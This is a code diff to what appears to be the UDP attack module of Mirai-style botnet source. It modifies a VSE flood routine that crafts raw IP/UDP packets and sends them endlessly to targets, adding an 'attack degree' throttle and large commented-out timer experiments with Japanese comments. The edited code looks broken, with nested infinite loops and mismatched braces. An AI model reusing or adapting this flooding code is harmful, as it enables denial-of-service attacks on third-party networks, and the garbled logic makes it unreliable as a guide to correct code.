@@ -1,5 +1,11 @@
 #define _GNU_SOURCE
 
+/* timer  */
+//#include <signal.h>
+//#include <unistd.h>
+//#include <string.h>
+//#define INTERVAL 10000000
+
 #ifdef DEBUG
 #include <stdio.h>
 #endif
@@ -21,7 +27,19 @@
 #include "table.h"
 #include "protocol.h"
 
+
+
 static ipv4_t get_dns_resolver(void);
+//struct timespec req = {0,100000000};
+/*
+void timer_handler(int signum){
+
+  //  while(TRUE){
+    printf("called timer handler\n");
+  //  nanosleep(&req,NULL);
+    //printf("called timer handler (end)\n");
+//    }
+}*/
 
 void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
@@ -158,6 +176,14 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
 }
 void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
+    //int k, pid;
+    //pid = fork();
+    //if(pid == -1)
+	//return;
+    //else if(pid == 0)
+	//attack_udp_generic(targs_len, targs, opts_len, opts);
+	
+
     int i, fd, j;
     char **pkts = calloc(targs_len, sizeof (char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
@@ -191,6 +217,51 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         return;
     }
 
+        //attack degree adjustment
+        uint32_t conf = attack_get_opt_int(opts_len, opts, ATK_OPT_DEGREE, 100);
+        if(conf<0)
+            conf=0;
+        if(conf>100)
+           conf=100;
+    
+    /* 
+	// timer 
+    struct sigaction act, oldact;
+    timer_t tid;
+    struct itimerspec itval;
+ 
+    memset(&act, 0, sizeof(struct sigaction));
+    memset(&oldact, 0, sizeof(struct sigaction));
+
+    // シグナルハンドラの登録
+    //struct timespec req = {0,(100-conf)*1000000};
+    act.sa_handler = timer_handler;
+    act.sa_flags = SA_RESTART;
+    if(sigaction(SIGALRM, &act, &oldact) < 0) {
+        perror("sigaction()");
+        return;
+    }
+ 
+    // タイマ割り込みを発生させる
+    itval.it_value.tv_sec = 0;     // 最初の1回目は5秒後
+    itval.it_value.tv_nsec = 1;
+    itval.it_interval.tv_sec = 0;  // 2回目以降は1秒間隔
+    itval.it_interval.tv_nsec = INTERVAL;
+ 
+    // タイマの作成
+    if(timer_create(CLOCK_REALTIME, NULL, &tid) < 0) {
+        perror("timer_create");
+        return;
+    }
+ 
+    //  タイマのセット
+    if(timer_settime(tid, 0, &itval, NULL) < 0) {
+        perror("timer_settime");
+        return;
+    }
+
+    printf("finish sleep timer set");
+    */
     for (i = 0; i < targs_len; i++)
     {
         struct iphdr *iph;
@@ -223,32 +294,24 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         util_memcpy(data, vse_payload, vse_payload_len);
     }
 
-	//attack degree adjustment
-        uint32_t conf = attack_get_opt_int(opts_len, opts, ATK_OPT_DEGREE, 100);
-	if(conf<0)
-	    conf=0;
-	if(conf>100)
-	   conf=100;
+	//attack degree adjustment	   
 	//1ms
     	struct timespec req = {0,(100-conf)*1000000*0.80};
 	//uint32_t rand;
 	int fc;
 	//printf("[attack_vse]%d",conf);
-
+ 
     while (TRUE)
     {
         for (i = 0; i < targs_len; i++)
         {
+// void at_timer_handler(int signum){
+ //       attack degree adjustment      
 
-	//attack degree adjustment	
-	//rand=(rand_next())%100;
-	//if(rand>=conf){
-  //  for(j = 0; j < 100 - conf; j++){
-	 if(conf!=100)       
-		nanosleep(&req,NULL);
-//	}
-	for(fc=0;fc<100*conf;fc++){
-
+        if(conf!=100)       
+              nanosleep(&req,NULL);
+        for(fc=0;fc<100*conf;fc++){
+        while(TRUE){
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct udphdr *udph = (struct udphdr *)(iph + 1);
@@ -270,17 +333,71 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
 
       sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+}
+}
+    //printf("start attack timer set");
 
-		}
-		       
+
+    /*
+    // attack timer 
+    struct sigaction at_act, at_oldact;
+    timer_t at_tid = tid;
+    struct itimerspec at_itval;
+
+    memset(&at_act, 0,  sizeof(struct sigaction));
+    memset(&at_oldact, 0, sizeof(struct sigaction));
+
+    // シグナルハンドラの登録
+    at_act.sa_handler = at_timer_handler;
+    at_act.sa_flags = SA_RESTART;
+    if(sigaction(SIGALRM, &at_act, &at_oldact) < 0) {
+        perror("sigaction()");
+        return;
+    }
+
+    // タイマ割り込みを発生させる
+    at_itval.it_value.tv_sec = 0;     // 最初の1回目は5秒後
+    at_itval.it_value.tv_nsec = (100-conf)*INTERVAL/100;
+    at_itval.it_interval.tv_sec = 0;  // 2回目以降は1秒間隔
+    at_itval.it_interval.tv_nsec = INTERVAL;
+
+    // タイマの作成
+    //if(timer_create(CLOCK_REALTIME, NULL, &conf* tid) < 0) {
+      //  perror("timer_create");
+        //return;
+    //}
+
+    //  タイマのセット
+    if(timer_settime(at_tid, 0, &at_itval, NULL) < 0) {
+        perror("timer_settime");
+        return;
+   }
+    printf("finish attack timer set");
+
 #ifdef DEBUG
 
             //break;
             //if (errno != 0)
             //    printf("errno = %d\n", errno);
 #endif
+    while (TRUE)
+    {
+        for (i = 0; i < targs_len; i++)
+        {
+
+
 		}
     	}
+   printf("attack finish¥n");
+	    // タイマの解除
+    timer_delete(tid);
+       timer_delete(at_tid);
+    // シグナルハンドラの解除
+    sigaction(SIGALRM, &oldact, NULL);
+    sigaction(SIGALRM, &at_oldact, NULL);
+*/
+}
+}
 }
 
 void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
